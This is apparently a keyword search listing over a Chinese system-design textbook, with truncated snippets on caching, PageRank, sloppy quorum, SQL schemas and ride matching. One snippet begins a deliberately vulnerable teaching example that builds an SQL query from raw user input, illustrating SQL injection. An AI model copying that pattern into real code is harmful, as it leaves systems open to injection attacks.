  c07_b05.md: ...ough 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异...
  c07_b05.md: ...千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Writ...
  c07_b05.md: ...久性风险。** 如果缓存服务器在脏条目刷盘前失败，数据就丢失了。你已经向用户返回成功，但数据从未持久化。  Write-behind 用于特定的高写入场景，其中一些数据丢失可接受（分析事件、计数器、非关键指标）。它几乎从不用于需要持久性的事务数据。...
  c07_b05.md: ...回想第 5 章，ACID 的 D——**持久性（Durability）**——意味着已提交事务在失败中幸存。Write-behind 缓存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解  许多工程师假...
  c07_b11.md: ...正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用显式检查缓存，...
  c07_b11.md: ...合：写入后随即被频繁读取的数据。例子：产品库存数——仓库操作更新，随后店铺在接下来几分钟读数百万次。  **Write-behind（write-back）：** 写入立即进入缓存，并异步刷到数据库。最适合：高容量写入工作负载，其中少量数据丢失可接受且...
  c07_b13.md: ...种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b) 用户的未读通知数（新事件发生时频繁更新）...
  c07_b13.md: ...1,000,000 变到 1,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数...
  c07_b13.md: ...CT COUNT(*) FROM posts`（大表上可能慢——可改用 Redis 中的物化计数器预计算）。Write-behind 模式在此完美：每次创建帖子递增 Redis 计数器，并定期把计数同步到数据库。用户始终看到 Redis 计数器，它精确...
  c07_b17.md: ...给应用。  **Write-through** 每次写入都保持缓存与数据库同步，消除陈旧但增加写入开销。**Write-behind** 批量写入，提升写性能但 risking 数据丢失。  **TTL** 是主要新鲜度旋钮。短 TTL 偏向一致性；长...
  c10_b10.md: ...储（多区复制、十一个 9） * 强事务保证 → 关系型数据库（ACID、WAL） * 为性能可接受丢失 → write-behind 缓存（设计上不持久）  **第 5 步：成本约束是什么？**  * 100 GB 热用户数据 → DRAM（500 U...
  c28_b11.md: ...高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则写失败 | 中 **Write-behind cache** (Ch 7) | 写延迟更低（异步写 DB） | 最终——DB 可能落后缓存 | 缓存失败且未写 DB...

=== pagerank (17 occurrences) ===
  c23_b06.md: ...提到 5 次的文档对该术语的密度更低。长度归一化防止长文档总是击败短小聚焦的文档。   #### 超越 TF-IDF——PageRank 与链接分析  TF-IDF 根据内容衡量文档与查询的相关性。但它无法衡量文档是否可信或权威。垃圾页面可以炮制一份文档，...
  c23_b07.md: ...#### 定义：PageRank（直觉）  **PageRank** 把网络建模为图，并给每个页面赋一个分数，表示随机网络冲浪者无限跟随链接最终落在该页...
  c23_b07.md: ...#### 定义：PageRank（直觉）  **PageRank** 把网络建模为图，并给每个页面赋一个分数，表示随机网络冲浪者无限跟随链接最终落在该页面的概率。来自高 PageRan...
  c23_b07.md: ...ageRank** 把网络建模为图，并给每个页面赋一个分数，表示随机网络冲浪者无限跟随链接最终落在该页面的概率。来自高 PageRank 页面的许多入链使页面获得高 PageRank 分数。  plain 语言：PageRank 通过背书结构衡量可信度。许...
  c23_b07.md: ...面赋一个分数，表示随机网络冲浪者无限跟随链接最终落在该页面的概率。来自高 PageRank 页面的许多入链使页面获得高 PageRank 分数。  plain 语言：PageRank 通过背书结构衡量可信度。许多可信页面链接你，你很可能也可信。高 Page...
  c23_b07.md: ...终落在该页面的概率。来自高 PageRank 页面的许多入链使页面获得高 PageRank 分数。  plain 语言：PageRank 通过背书结构衡量可信度。许多可信页面链接你，你很可能也可信。高 PageRank 页面链接你，比低 PageRank...
  c23_b07.md: ...Rank 分数。  plain 语言：PageRank 通过背书结构衡量可信度。许多可信页面链接你，你很可能也可信。高 PageRank 页面链接你，比低 PageRank 页面链接你更有分量。  迭代计算：  PageRank(p) = (1 - d)/...
  c23_b07.md: ...：PageRank 通过背书结构衡量可信度。许多可信页面链接你，你很可能也可信。高 PageRank 页面链接你，比低 PageRank 页面链接你更有分量。  迭代计算：  PageRank(p) = (1 - d)/N + d × Σ_{q ∈ lin...
  c23_b07.md: ...链接你，你很可能也可信。高 PageRank 页面链接你，比低 PageRank 页面链接你更有分量。  迭代计算：  PageRank(p) = (1 - d)/N + d × Σ_{q ∈ links to p} PageRank(q)/out-lin...
  c23_b07.md: ...量。  迭代计算：  PageRank(p) = (1 - d)/N + d × Σ_{q ∈ links to p} PageRank(q)/out-links(q)  其中 d 是阻尼系数（通常 0.85），N 是总页数，求和覆盖所有链接到 p 的页面...
  c23_b07.md: ...重新计算，所以是批处理操作。   #### 现代排序——众多信号  真实搜索引擎使用数百种信号，远超 TF-IDF 和 PageRank：  * 锚文本（指向某页面的链接中的可点击文字常是该页面的好描述） * 页面新鲜度（最近更新页面对时间敏感查询排名更高...
  c23_b08.md: ...。 3. **打分：** 对每个候选文档（出现在 posting list 交集中的文档），计算结合 TF-IDF 和 PageRank 的相关性分数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果列表。可用大小为 K...
  c23_b10.md: ...：每个分片从本地倒排索引查找 3 个词的 posting list，交集得到候选文档 ID，用 TF-IDF 和预计算 PageRank（每个文档存储）对候选打分，返回 top-K 结果。这是主导延迟步骤。(4) **合并与重新排序**（约 5ms）：协调...
  c23_b12.md: ...#### 深入思考  **Q1.** 把侦探纪律应用于网页：PageRank 把链接视为背书。但如果每个人都知道链接能提高 PageRank，垃圾信息制造者会创建数百万假页面都链接到他们的网站。这...
  c23_b12.md: ...## 深入思考  **Q1.** 把侦探纪律应用于网页：PageRank 把链接视为背书。但如果每个人都知道链接能提高 PageRank，垃圾信息制造者会创建数百万假页面都链接到他们的网站。这叫链接垃圾。作为搜索引擎设计者，你会如何思考并防御？除原始链接计...
  c23_b13.md: ...短语匹配。  **TF-IDF** 通过术语特异性镜头对文档相关性排序：语料库中罕见但文档中频繁的词是强相关性信号。**PageRank** 用结构信号增强内容信号：网络链接图编码了关于页面质量的集体人类判断。  查询流水线跨文档分片扇出，收集并行结果并合...
  c28_b14.md: ...ing** (Ch 23) | 无查询延迟开销（分数预计算） | N/A | N/A | 中——语料变化时重算分数 **PageRank** (Ch 23) | 无查询延迟开销（批量计算） | 最终（定期重算） | N/A | 高——分布式图计算 **We...

=== sloppy (17 occurrences) ===
  c26_b03.md: ...（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quor...
  c26_b03.md: ...节点故障都会导致对应键的写失败。  Dynamo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b03.md: ...（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quor...
  c26_b03.md: ...节点故障都会导致对应键的写失败。  Dynamo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 prefer...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference list 中的 W 个节...
  c26_b04.md: ...回来时给它”）。A 回来时，邻居交还数据。这使系统保持高可用——写总是成功到 W 个节点——代价是偶尔的临时不一致。  Sloppy quorum 显著提升可用性。没有它，任一节点故障都会导致其拥有的键写失败。有了它，只要任意 W 个节点可达，写可用性...
  c26_b06.md: ...R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必...
  c26_b07.md: ...引入或普及了本章大部分概念。其关键创新：  1. **带虚拟节点的一致性哈希：** 解决数据分布与再平衡问题 2. **Sloppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree...
  c26_b10.md: ...line", new_value)`。写协调器是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然后追踪后续读 `GET("user:101:timel...
  c26_b10.md: ..."user:101:timeline")` 在 R=1 下的去向。读有哪些可能结果，什么决定哪种结果？  提示  记住 sloppy quorum 允许写到任意 W 个可用节点。从 A 的视角看哪些节点可达。然后想 R=1 的读可能联系哪个节点。  *...
  c26_b10.md: ...写追踪：节点 A（协调器）尝试写入 preference list [A, B, C]。节点 C 被隔离——不可达。在 sloppy quorum 下，A 用可用节点继续。W=1，所以只写到 A 就满足写 quorum。A 也复制给 B（都在 pref...
  c26_b13.md: ...–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置...
  c26_b13.md: ...N 给出最终一致性。SocialSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标...
  c26_b13.md: ...–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置...
  c26_b13.md: ...N 给出最终一致性。SocialSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标...
  c28_b14.md: ...**Geohashing** (Ch 25) | 极低（前缀键查找） | 最终（空间索引异步更新） | 高 | 低 **Sloppy quorum + hinted handoff** (Ch 26) | 低（写到任意 W 节点） | 最终（标准节点可...

=== delete (16 occurrences) ===
  c05_b06.md: ...RY KEY,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         like_co...
  c05_b06.md: ...llows (         follower_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         followed_id INTEGER REFERENCES users(id) O...
  c05_b06.md: ...ASCADE,         followed_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),...
  c05_b06.md: ...likes (         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         post_id     INTEGER REFERENCES posts(id) O...
  c05_b06.md: ...ASCADE,         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),...
  c05_b10.md: ...tions (         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         user_id     INTEGER REFERENCES users(id) O...
  c05_b10.md: ...ASCADE,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),...
  c05_b11.md: ...反规范化计数器）是行业标准选择。大表上的计数查询很贵，而点赞数一天被读数百万次。一致性风险通过把计数器与 insert/delete 放在同一事务中更新来管理。这遵循与 SocialSnap v1 的 `follower_count` 和 `follo...
  c05_b11.md: ...user_id     INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         image_u...
  c09_b08.md: ...te Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42...
  c09_b08.md: .../users/42                  → partial update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应...
  c09_b08.md: ...al update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信...
  c09_b08.md: ...te Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42...
  c09_b08.md: .../users/42                  → partial update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应...
  c09_b08.md: ...al update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信...
  c11_b14.md: ...users SET ... WHERE id = %s", [..., user_id])         redis.delete(f"user:{user_id}:profile")  # 一次删除对所有服务器失效   因为所有服务器共享同一个 R...

=== null (16 occurrences) ===
  c05_b06.md: ...IAL PRIMARY KEY,         username    VARCHAR(50) UNIQUE NOT NULL,         email       VARCHAR(255) UNIQUE NOT NULL,...
  c05_b06.md: ...NIQUE NOT NULL,         email       VARCHAR(255) UNIQUE NOT NULL,         password_hash VARCHAR(255) NOT NULL,         follo...
  c05_b06.md: ...55) UNIQUE NOT NULL,         password_hash VARCHAR(255) NOT NULL,         follower_count INTEGER DEFAULT 0,         followin...
  c05_b06.md: ...S users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         like_count  INTEGER DEFAULT 0,         created_at...
  c05_b08.md: ...案：** **主键（primary key）** 唯一标识表内的每一行。表中不能有两行具有相同的主键值，也不能有主键为 NULL 的行。在 SocialSnap 的 `users` 表中，`id` 是主键——它是每个用户的权威标识符。  **外键（...
  c06_b12.md: ...ERIAL PRIMARY KEY,         name            VARCHAR(200) NOT NULL,         dob             DATE NOT NULL,         insurance_i...
  c06_b12.md: ...VARCHAR(200) NOT NULL,         dob             DATE NOT NULL,         insurance_id    VARCHAR(100)     );      CREATE TA...
  c06_b12.md: ...NCES patients(id),         drug_name       VARCHAR(200) NOT NULL,         dosage          VARCHAR(100),         frequency...
  c06_b12.md: ...quency       VARCHAR(100),         started_on      DATE NOT NULL,         ended_on        DATE  -- NULL means still active...
  c06_b12.md: ...ted_on      DATE NOT NULL,         ended_on        DATE  -- NULL means still active     );      CREATE TABLE clinical_notes...
  c08_b14.md: ..."timestamp": "2024-03-15T14:23:01Z",       "expires_at": null,       "priority": "normal"     }        {       "event_typ...
  c15_b13.md: ...dempotency_key: "saga_7f3a9b2c_upgrade"     payment_result: null | {charge_id: ..., amount: 9.99}   **幸福路径：**  1. 开始：设置 `cur...
  c20_b04.md: ...ARCHAR(16), PRIMARY KEY) — 短码或自定义别名 * `long_url` (TEXT, NOT NULL) — 目标 URL * `created_at` (TIMESTAMP, NOT NULL) * `expires_a...
  c20_b04.md: ...l` (TEXT, NOT NULL) — 目标 URL * `created_at` (TIMESTAMP, NOT NULL) * `expires_at` (TIMESTAMP, NULLABLE) * `created_by_ip` (IN...
  c20_b04.md: ...UTO-INCREMENT PRIMARY KEY) * `short_code` (VARCHAR(16), NOT NULL, FK → urls) * `clicked_at` (TIMESTAMP, NOT NULL) * `referre...
  c20_b04.md: ...AR(16), NOT NULL, FK → urls) * `clicked_at` (TIMESTAMP, NOT NULL) * `referrer` (TEXT, NULLABLE) * `user_agent` (TEXT, NULLAB...

=== top (16 occurrences) ===
  c06_b11.md: ...ZINCRBY trending_hashtags:2024-01-15 1 "#engineering"   取当天 Top 10 热门 hashtag：       ZREVRANGE trending_hashtags:2024-01-15...
  c06_b15.md: ...对象存储的场景。  **热门 hashtag：** 带有序集合的键值存储（Redis）。每个帖子的实时计数器更新，查询 Top-N。Redis 的 `ZINCRBY` 和 `ZREVRANGE` 就是为此专门构建的。  **私信：** 列族存储（...
  c07_b14.md: ...子的排序列表。Feed 计算昂贵：需要 join `follows` 表和 `posts` 表，按时间/排序分排序，取 Top 50 帖子。每天有 500,000 名活跃用户，每人平均每天加载 8 次 Feed，该查询每天运行约 4 百万（400...
  c07_b15.md: ...**答案：**  **缓存 key：** `user:{user_id}:feed` —— 每个用户一个条目，存储 Top 50 帖子 ID 及其排序分的序列化列表。  **TTL：** 2–5 分钟。只要用户关注的人发了新帖子，Feed 就...
  c19_b05.md: ...号、私信以及任何受监管的数据（医疗记录、财务数据）。   ### 19.4 Web 应用漏洞——经典问题  OWASP Top 10 是最常见、影响最大的 Web 应用漏洞定期更新列表。其中三类反复出现，每个系统设计师都必须理解。...
  c22_b06.md: ...混合：** 写时存基础分（BASE score，只用帖子内在质量信号，不用用户专属亲密度）。读时用用户专属亲密度信号对 top-N 候选重新排序。这减少读时计算：只给 timeline 中已按基础分排好序的前 100 个候选打完整模型分，而非对全...
  c23_b08.md: ...现在 posting list 交集中的文档），计算结合 TF-IDF 和 PageRank 的相关性分数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。...
  c23_b08.md: ...最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。 5. **结果增强：** 为 top-K 文档获取标题、摘要和 URL，显示在结果页。  步骤 2 和 3 跨分片并行。扇出是：一个查询 → 并行命中所有文...
  c23_b08.md: ...URL，显示在结果页。  步骤 2 和 3 跨分片并行。扇出是：一个查询 → 并行命中所有文档分片 → 每个分片返回其 top-K 结果 → 结果合并并全局重新排序。  鉴于高查询量（100,000 QPS），倒排索引服务层必须大量复制。这是读多...
  c23_b08.md: ...现在 posting list 交集中的文档），计算结合 TF-IDF 和 PageRank 的相关性分数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。...
  c23_b08.md: ...最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。 5. **结果增强：** 为 top-K 文档获取标题、摘要和 URL，显示在结果页。  步骤 2 和 3 跨分片并行。扇出是：一个查询 → 并行命中所有文...
  c23_b08.md: ...URL，显示在结果页。  步骤 2 和 3 跨分片并行。扇出是：一个查询 → 并行命中所有文档分片 → 每个分片返回其 top-K 结果 → 结果合并并全局重新排序。  鉴于高查询量（100,000 QPS），倒排索引服务层必须大量复制。这是读多...
  c23_b10.md: ...ing list，交集得到候选文档 ID，用 TF-IDF 和预计算 PageRank（每个文档存储）对候选打分，返回 top-K 结果。这是主导延迟步骤。(4) **合并与重新排序**（约 5ms）：协调器接收所有 100 个分片的 top-K...
  c23_b10.md: ...回 top-K 结果。这是主导延迟步骤。(4) **合并与重新排序**（约 5ms）：协调器接收所有 100 个分片的 top-K 结果，合并成单一排序并选择全局前 10。(5) **结果增强**（约 10ms）：从单独文档存储（非倒排索引）为前...
  c25_b04.md: ...可用司机 3. **候选排序：** 按估算到乘客位置的驾驶时间排序（使用预计算 ETA 数据，稍后讨论） 4. **向 top 候选发出邀请：** 向排名第一的司机发送推送通知 5. **等待接受：** 若司机 15 秒内接受，匹配完成。否则向下...
  c25_b04.md: ...。并行邀请存在两位司机同时接受的尴尬局面——系统必须取消其中一个接受，体验差。串行更慢但更干净。真实系统用混合：同时向 top 3 发出邀请，接受最快响应，取消其他。  待处理 ride request 的状态机由匹配服务管理。每个状态转换（RE...

=== request (15 occurrences) ===
  c17_b04.md: ...：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日志：**       {       "timestamp": "...
  c17_b04.md: ...—哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部署然后修复后，你需要把日志事件与代码版本关联。 4. **Request ID（trace ID）**——每个用户请求入口生成的唯一标识符，并通过每次服务调用传播。这是跨服务关联日志的关键字段...
  c17_b04.md: ...：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日志：**       {       "timestamp": "...
  c17_b04.md: ...—哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部署然后修复后，你需要把日志事件与代码版本关联。 4. **Request ID（trace ID）**——每个用户请求入口生成的唯一标识符，并通过每次服务调用传播。这是跨服务关联日志的关键字段...
  c18_b02.md: ...：真实数据库查询 bug、真实序列化错误、真实认证流程问题。  集成测试应在 CI（持续集成）中运行——每次 pull request 自动运行——但因为速度较慢，不必作为本地开发循环的一部分。...
  c19_b06.md: ...注入  回想第 5 章：关系型数据库解释 SQL 查询。考虑这段代码（伪代码）：       user_input = request.get("username")     query = f"SELECT * FROM users WHERE use...
  c19_b16.md: ...、服务账户）。权限作为代码定义在基础设施即代码（Terraform、CloudFormation）中，并通过 pull request 审查。权限变更与代码变更走相同审查流程。 * **“足够最小权限”的权限集：** 不必微观精确，而是为每个数据域（用户...
  c25_b04.md: ...，体验差。串行更慢但更干净。真实系统用混合：同时向 top 3 发出邀请，接受最快响应，取消其他。  待处理 ride request 的状态机由匹配服务管理。每个状态转换（REQUESTED → OFFERED_TO_DRIVER、OFFERED_TO...
  c25_b04.md: ...distributed transaction）**：单个司机被原子地从“可用”池移动到“已分配”状态，同时 ride request 被原子地从“待处理”移动到“已接受”。  若此操作使用最终一致性，不同数据中心的两个调度服务器可能同时读到司机为“可用...
  c25_b04.md: ...y-once 语义。  回忆第 4 章：强一致性以可用性为代价。网络分区期间，强一致的匹配服务可能无法处理新 ride request。真实系统接受这一点：短暂显示“无可用车辆”比司机双重预订更好。  * * *...
  c25_b05.md: ...存，并按地理区域分片。每个区域的图维护在专用路由服务器上。   #### 动态加价作为控制系统  某地理区域 ride request 超过可用司机时，动态加价激活：价格上涨以同时减少需求（部分乘客因高价放弃）并增加供给（更高收入使更多司机愿意上线）。...
  c25_b05.md: ...愿意上线）。  动态加价实现为一个控制循环：  1. **监控：** 持续观察每个 geohash 单元格的 ride request 与可用司机比率，按滚动 5 分钟窗口聚合 2. **触发：** 若 request-to-driver 比率超过阈值（...
  c25_b05.md: ...geohash 单元格的 ride request 与可用司机比率，按滚动 5 分钟窗口聚合 2. **触发：** 若 request-to-driver 比率超过阈值（如 2:1），对该单元格激活加价 3. **设置倍数：** 倍数与供需失衡成正比（2...
  c25_b05.md: ...衡成正比（2:1 时 1.5×，4:1 时 2×，等等） 4. **传播：** 更新定价服务；该单元格所有新 ride request 收到加价；进行中行程不受影响 5. **重新评估：** 每 5 分钟重新计算比率并调整倍数  这是 **比例控制系统（...
  c25_b11.md: ...求用车时锁定，而非行程开始或结束时。这创造了一个一致、用户可理解的契约（“你请求时已同意 2×”）。数据模型：ride request 创建时，系统把请求时的动态加价倍数直接记录在 `trips` 表中：`trips.surge_multiplier =...

=== typeahead (15 occurrences) ===
  c23_b07.md: ...类标注训练数据上学习：标注员对搜索结果质量打分，模型学习预测这些评分。  * * *   ### 23.4 查询处理与 Typeahead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"dis...
  c23_b07.md: ...ted systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——...
  c23_b07.md: ...、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索...
  c23_b07.md: ..."，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead...
  c23_b07.md: ...Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist"...
  c23_b07.md: ...须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist" 开头的前 10 个最频繁搜索查询就是建议...
  c23_b07.md: ...个前缀预计算一组有限的热门建议，并缓存在小型键值存储中。预计算作为批处理作业定期（如每小时）在查询日志上运行。缓存回答 typeahead 请求而无需命中完整搜索索引。...
  c23_b07.md: ...类标注训练数据上学习：标注员对搜索结果质量打分，模型学习预测这些评分。  * * *   ### 23.4 查询处理与 Typeahead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"dis...
  c23_b07.md: ...ted systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——...
  c23_b07.md: ...、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索...
  c23_b07.md: ..."，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构  Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead...
  c23_b07.md: ...Typeahead 必须极快——建议必须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist"...
  c23_b07.md: ...须在用户输入速度之前出现，理想 < 100ms。而且全球用户都在同一搜索框输入，typeahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist" 开头的前 10 个最频繁搜索查询就是建议...
  c23_b07.md: ...个前缀预计算一组有限的热门建议，并缓存在小型键值存储中。预计算作为批处理作业定期（如每小时）在查询日志上运行。缓存回答 typeahead 请求而无需命中完整搜索索引。...
  c23_b12.md: ...。(3) **本地化：** 搜索引擎是否应返回与用户国家相关的结果，即使其他语言有更好来源？(4) **自动补全：** typeahead 的建议来自聚合查询历史。如果许多用户搜索有害或偏见内容，自动补全会把这些搜索作为可见建议延续下去。这些本质上都是有道德...

=== availability (14 occurrences) ===
  c02_b02.md: ...吞吐翻倍，你必须处理更多并行请求。你能并行到什么程度是有极限的——既受硬件限制，也受协调成本限制。   ### 2.2 Availability——“在”的承诺  SocialSnap 在周二的下午 2 点宕机一小时。这有多严重？  取决于场景。如果 Social...
  c02_b02.md: ...可接受。如果 SocialSnap 是金融机构使用的交易平台，在市场时间宕机一小时可能损失数百万美元并断送职业生涯。  Availability（可用性）精确地捕捉了这一关切。   #### 定义：Availability  **Availability（可用性）...
  c02_b02.md: ...小时可能损失数百万美元并断送职业生涯。  Availability（可用性）精确地捕捉了这一关切。   #### 定义：Availability  **Availability（可用性）** 是系统正常运行并能正确响应请求的时间比例。  用大白话说：可用性就是你的...
  c02_b02.md: ...生涯。  Availability（可用性）精确地捕捉了这一关切。   #### 定义：Availability  **Availability（可用性）** 是系统正常运行并能正确响应请求的时间比例。  用大白话说：可用性就是你的服务“在线”的时间百分比。  可...
  c02_b06.md: ...f 值得吗？   ### 2.7 SLI、SLO 与 SLA——把权衡变成承诺  Latency、throughput、availability——到目前为止这些还是抽象指标。真实系统需要把这些指标变成承诺：对用户的承诺、对客户的承诺、对你自己团队关于系统必须有多...
  c02_b09.md: ...nce 方案的成本。  **Q2.** 你正在设计一个银行转账系统。请把六个指标（latency、throughput、availability、consistency、durability、partition tolerance）按对该用例的重要性排序，并说明前...
  c02_b09.md: ...建议排序（对转账系统从最关键到最不重要）：**Durability（持久性） > Consistency（一致性） > Availability（可用性） > Partition Tolerance（分区容错性） > Throughput（吞吐） > Latenc...
  c16_b12.md: ...两次故障事件之间的平均时间——系统失败的频率。MTTR（平均恢复时间）是故障后恢复服务的平均时间——系统恢复的速度。  Availability = MTBF / (MTBF + MTTR)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MT...
  c28_b10.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Cachi...
  c28_b11.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Relat...
  c28_b12.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Horiz...
  c28_b13.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Grace...
  c28_b14.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **URL s...
  c28_b15.md: ...Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Micro...

=== rps (14 occurrences) ===
  c02_b01.md: ...）** 表示。  用大白话说：吞吐是系统能同时持续做多少件事。如果你的 Web 服务器在性能下降前能处理 10,000 RPS，它的吞吐就是 10,000 RPS。...
  c02_b01.md: ...系统能同时持续做多少件事。如果你的 Web 服务器在性能下降前能处理 10,000 RPS，它的吞吐就是 10,000 RPS。...
  c17_b11.md: ...LO：**（新且不常见）99% 的 feed 响应至少展示一条最近 5 分钟的帖子  可用性 SLO 在 50,000 RPS 时的错误预算：0.1% = 每秒 50 次允许失败，或每月约 4300 万（43 million）次允许失败。这给团队...
  c18_b02.md: ...ame`，但渲染服务仍期望 `author_name`”。负载测试捕获“Redis 连接池设为 10 个连接，5000 RPS 时我们耗尽它。”   #### 常见误解  分布式系统最常见的测试误解是：全面的单元测试覆盖率足以支撑对生产的信心。工...
  c18_b13.md: ...**恢复时的负载削减：** Auth Service 在启动阶段应限制入站请求。重启后的前 30 秒最多接受 500 RPS，逐渐增加到满容量以完成预热。  这次混沌实验很有价值，正因为它揭示了单元测试、集成测试和负载测试都无法捕获的失败模式：...
